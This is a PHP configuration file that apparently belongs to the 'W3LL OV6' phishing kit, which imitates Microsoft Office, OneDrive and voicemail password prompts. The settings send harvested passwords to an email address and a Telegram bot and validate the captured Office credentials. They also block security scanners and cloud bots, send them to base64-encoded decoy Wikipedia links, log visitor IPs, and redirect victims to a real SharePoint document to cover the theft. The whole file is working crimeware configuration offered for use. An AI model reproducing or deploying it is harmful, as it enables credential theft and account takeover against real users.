<?php
require __DIR__.'/email.php';

if(!isset($_SESSION)) 
{ 
    session_start(); 
} 

// YOU CAN CHANGE ALL OF THESE SETTINGS

$token = 'W3LL-OV6-airnor-yHRs4QlMLTxvjnZUS8ikh6oAE'; // OV6 Token from tools setting menu on shop

$captha = false; //Set to false to turn off captha & set to true to turn on!

$reporttele = false; //Set to false to turn off report to telegram & set to true to turn on!
$teletoken = 'BOT TOKEN HERE'; //Set your telegram bot token here
$telechatid = 'TELEGRAM GROUP CHAT ID HERE'; //Set your telegram group chat id here

$officevalid = true; //Set to false to turn off office validation & set to true to turn on!

$cloudsblock = true; //Set to false to turn off antibot cloud block & set to true to turn on!

$reportinvalid = true; //Set to false to turn off report invalid & set to true to turn on!

$AutoGrab = true; //Set to true to turn on auto grab, set to false to turn off auto grab (to access link without auto grab, use the link like this domain.com/O%20V%206/)

$Resetlogs = false; //Set to true to turn on reset logs, set to false to turn off reset logs
$ResetAllow = true; //Set to true to turn on reset allow, set to false to turn off reset list of blocked ips and emails and regions (allow all except bot)

$onlylistemails = false; //Set to true to turn on only list emails, set to false to turn off allow only a list of emails (put emails in EMAILS.txt. Each email in line)
$onlyonetimeuse = false; //Set to true to turn on only one time use, set to false to turn off only one time use (will make page become died after the user put all passwords)

$successMsgTitle = 'Success'; //Set the title of the success message
$successMsg = 'Successfully confirmed<br/>Redirecting to Document...'; //Set the success message
$successMsgTimeout = '3000'; //Set the timeout of the success message (in ms)

$visitorfileName = "power.txt";// Name of file to save all visitors IP logs; may contain also bot IP logs. replace it with "false" to stop it.
$logsfileName = "ranger.txt";// Name of file to save real visitors IP logs; replace it with "false" to stop it

$fromname = "Logs";// Name of the sender of the email
$subjectTitle = "| [GIFT FROM W3LL]"; //Set the subject of the email

$officeLink = "https://hoskins10-my.sharepoint.com/:b:/g/personal/simone_ezipmortgage_com/EW3s7A_qnc5Hr05aGVwniQsB2ZE6a93lKg2Dh0dyfCynrg?e=5c2GHR"; //Set the link where its will redirect to after successfully confirmed

$firstmsg = 1; // false/1/2/3/4
// 1 = Because you're accessing sensitive info, you need to verify your password
// 2 = Enter password to access your office Mail
// 3 = Because you're accessing sensitive info, you need to verify your password to access your Voicemail
// 4 = Verify your password to access your Microsoft OneDrive
// YOU CAN CHANGE ALL OF THESE SETTINGS





























// DONT CHANGE ANYTHING BELOW THIS LINE
$base64encodeData = true;
$limitedarea = false;
$fixIndex = false;
$randfirstpart = base64_encode($_SERVER['REQUEST_URI']);
$TitlesArray=array("verify your account","Verify your identity","verify your credentials","verify your informations","verify your email","verify your login","confirm your account","confirm your identity","confirm your credentials","confirm your information","confirm your email","confirm your login","signin to your account","connect your account");
$link = array("aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9NaWNyb3NvZnRfMzY1","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9MaXN0X29mX01pY3Jvc29mdF8zNjVfQXBwbGljYXRpb25z","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9DYXRlZ29yeTpPZmZpY2VfMzY1","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2lkLndpa2lwZWRpYS5vcmcvd2lraS9CZXJrYXM6TG9nb19NaWNyb3NvZnRfT2ZmaWNlXzM2NV8oMjAxMy0yMDE5KS5zdmc=","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9NaWNyb3NvZnRfT2ZmaWNlX01peA==","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9NaWNyb3NvZnRfRXhjaGFuZ2VfU2VydmVy","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9FbWFpbF9jbGllbnQ=","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9FbWFpbA==","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9DbGllbnRfYWNjZXNzX2xpY2Vuc2U=","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9XaW5kb3dzX1NlcnZlcl8yMDE2","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9XaW5kb3dzX1NlcnZlcl8yMDE5","aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9JbnRlcm5ldF9FeHBsb3Jlcl8xMQ==");
$random = rand(0, 11);
$FailRedirect = base64_decode($link[$random]);
$toEmail = $to;
// DONT CHANGE ANYTHING ABOVE THIS LINE
//OV6-9-23-22
?>